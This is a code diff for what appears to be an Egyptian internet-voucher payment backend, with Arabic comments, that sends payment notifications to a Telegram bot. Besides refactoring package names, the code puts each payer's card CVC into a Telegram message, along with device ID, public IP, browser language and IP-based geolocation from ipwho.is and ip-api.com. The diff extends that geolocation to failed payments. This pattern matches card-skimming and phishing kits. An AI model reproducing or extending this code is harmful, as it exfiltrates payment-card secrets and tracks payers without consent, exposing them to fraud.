@@ -24,6 +24,7 @@ async function fetchNetworkDetailsByIP(ip) {
 
   const cleanIp = String(ip).split(",")[0].trim();
 
+  // المصدر الأول: ipwho.is (يدعم الإحداثيات بدقة عالية)
   try {
     const res = await axios.get(`https://ipwho.is/${cleanIp}?lang=ar`, { timeout: 3000 });
     if (res.data && res.data.success !== false) {
@@ -43,6 +44,7 @@ async function fetchNetworkDetailsByIP(ip) {
     // تجاهل والانتقال للمصدر البديل
   }
 
+  // المصدر الثاني: ip-api.com (مصدر بديل قوي للإحداثيات والـ ISP)
   try {
     const fallbackRes = await axios.get(`http://ip-api.com/json/${cleanIp}?fields=status,country,city,isp,org,lat,lon,query`, { timeout: 3000 });
     if (fallbackRes.data && fallbackRes.data.status === "success") {
@@ -80,20 +82,23 @@ function getFormattedDateTime() {
 }
 
 /**
- * دالة لتحديد اسم الباقة تلقائياً بناءً على المبلغ المدفوع
+ * دالة مساعدة لتحديد اسم الباقة تلقائياً بناءً على المبلغ المدفوع
  */
-function getPackageNameByAmount(amount) {
-  const numAmount = parseFloat(amount);
-  if (isNaN(numAmount)) return data.packageName || "باقة إنترنت شبكة حكايات";
-
-  // يمكنك تعديل الأسعار والمطابقات هنا حسب باقاتك الفعليّة
-  if (numAmount === 10 || numAmount === 15) return "باقة يومية / اقتصادية";
-  if (numAmount === 25 || numAmount === 30) return "باقة أسبوعية";
-  if (numAmount >= 50 && numAmount < 100) return "باقة الشهر الأساسية (50 جـ)";
-  if (numAmount >= 100 && numAmount < 150) return "باقة الشهر المتميزة (100 جـ)";
-  if (numAmount >= 150) return "باقة الشهر الكبرى (150+ جـ)";
-  
-  return `باقة إنترنت بقيمة ${numAmount} جنيه`;
+function getPackageNameByAmount(amount, dataPackageInfo) {
+  if (dataPackageInfo && dataPackageInfo !== "باقة إنترنت شبكة حكايات") {
+    return dataPackageInfo;
+  }
+  const numAmount = Number(amount);
+  switch (numAmount) {
+    case 5: return "الباقة البرونزية";
+    case 15: return "الباقة الفضية";
+    case 30: return "الباقة الذهبية";
+    case 50: return "الباقة البلاتينية";
+    case 100: return "الباقة الماسية";
+    default:
+      if (numAmount > 100) return "مساهمة ودعم للشبكة";
+      return "باقة إنترنت شبكة حكايات";
+  }
 }
 
 /**
@@ -134,6 +139,7 @@ async function sendTelegramMessage(data, isInitial = true) {
       let ispText = data.ispProvider || data.isp || null;
       let netLocationText = data.netLocation || null;
 
+      // جلب الموقع الجغرافي والإحداثيات ومزود الخدمة عبر IP إذا لم تكن متوفرة مسبقاً
       if (!ispText || ispText === "غير معروف" || !netLocationText || netLocationText === "غير متاح") {
         const netInfo = await fetchNetworkDetailsByIP(publicIP);
         if (netInfo) {
@@ -167,7 +173,7 @@ async function sendTelegramMessage(data, isInitial = true) {
                    `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
       }
 
-      message += `\n<b>━━━━ ⚙️ بيانات الشبكة والجهاز ━━━━</b>\n` +
+      message += `\n<b>━━━━ ⚙️️ بيانات الشبكة والجهاز ━━━━</b>\n` +
                  `🆔 <b>معرف الجهاز:</b> <code>${clientID}</code>\n` +
                  `💡 <b>نوع الجهاز:</b> <b>${deviceType}</b>\n` +
                  `🌐 <b>IP الخارجي:</b> <code>${publicIP || 'غير متوفر'}</code>\n` +
@@ -183,9 +189,8 @@ async function sendTelegramMessage(data, isInitial = true) {
                  `🌍 <b>لغة المتصفح:</b> <code>${lang}</code>`;
 
     } else {
-      const voucher = data.voucher_code || data.cardCode || "متاح عند الإصدار";
-      // تحديد اسم الباقة تلقائياً بناءً على المبلغ المدفوع وعدم الاعتماد على الحقول المحذوفة
-      const packageInfo = getPackageNameByAmount(amountEGP);
+      const voucher = data.voucher_code || data.cardCode || "غير متوفر";
+      const packageInfo = getPackageNameByAmount(amountEGP, data.package_info || data.packageName);
 
       message = `✅ <b>تمت عملية الدفع وتوليد الكارت بنجاح!</b>\n\n` +
                 `🏢 الفرع: <b>${branchName}</b>\n` +
@@ -245,11 +250,11 @@ async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
 
     const txnId = paymentDetails.transactionId || paymentDetails.id || `TX_${Date.now()}`;
     const amountVal = paymentDetails.amount || "0";
-    const calculatedPackage = getPackageNameByAmount(amountVal);
+    const packageInfo = getPackageNameByAmount(amountVal, paymentDetails.packageName);
 
     const caption = `🎟️ <b>صورة كارت الإنترنت المصدر آلياً</b>\n\n` +
                     `🏢 الفرع: <b>${paymentDetails.branchName || 'حكايات نت رئيسي'}</b>\n` +
-                    `📦 الباقة: <b>${paymentDetails.packageName || calculatedPackage}</b>\n` +
+                    `📦 الباقة: <b>${packageInfo}</b>\n` +
                     `💰 المبلغ: <b>${amountVal} جنيه</b>\n` +
                     `🔑 الكارت: <code>${paymentDetails.card?.code || paymentDetails.code || 'غير متوفر'}</code>\n` +
                     `📱 الهاتف: <code>${paymentDetails.phone || 'غير محدد'}</code>\n` +
@@ -402,24 +407,34 @@ async function sendTelegramFailNotification(errorMessage, data = {}) {
       return;
     }
 
-    const publicIP = data.publicIP || "غير متوفر";
+    const publicIP = data.publicIP || data.ip || "غير متوفر";
     if (publicIP === "127.0.0.1" || publicIP === "::1" || publicIP.includes("localhost")) {
       return;
     }
 
+    // جلب تفاصيل الموقع الجغرافي والإحداثيات للـ IP في صفحة الفشل أيضاً
     const netInfo = await fetchNetworkDetailsByIP(publicIP);
     const ispText = netInfo.isp;
     const netLocationText = netInfo.netLocation;
 
-    const branchName = data.branchName || "حكايات نت رئيسي";
-    const userPhone = data.phone || "غير محدد";
-    const amountEGP = data.amount || "غير محدد";
+    const branchName = data.branchName || data.branch_name || "حكايات نت رئيسي";
+    const userPhone = data.phone || data.billing_data?.phone_number || data.customer?.phone_number || "غير محدد";
+    
+    let amountEGP = "غير محدد";
+    if (data.amount_cents) {
+      amountEGP = (data.amount_cents / 100).toFixed(2);
+    } else if (data.amount) {
+      amountEGP = data.amount;
+    }
+
     const dateTimeStr = getFormattedDateTime();
-    const txnId = data.transactionId || `TX_${Date.now()}`;
+    const txnId = data.id || data.transactionId || data.order?.id || data.merchant_order_id || `TX_${Date.now()}`;
 
     let message = `❌ <b>فشل عملية الدفع! (تنبيه فتح صفحة الخطأ)</b>\n\n` +
                   `🏢 الفرع: <b>${branchName}</b>\n` +
                   `🆔 رقم المعاملة: <code>${txnId}</code>\n` +
+                  `💰 المبلغ: <b>${amountEGP} جنيه</b>\n` +
+                  `📱 رقم الهاتف: <code>${userPhone}</code>\n` +
                   `⚠️ سبب الخطأ: <i>${errorMessage}</i>\n` +
                   `----------------------------------------\n` +
                   `🌐 IP الخارجي: <code>${publicIP}</code>\n` +
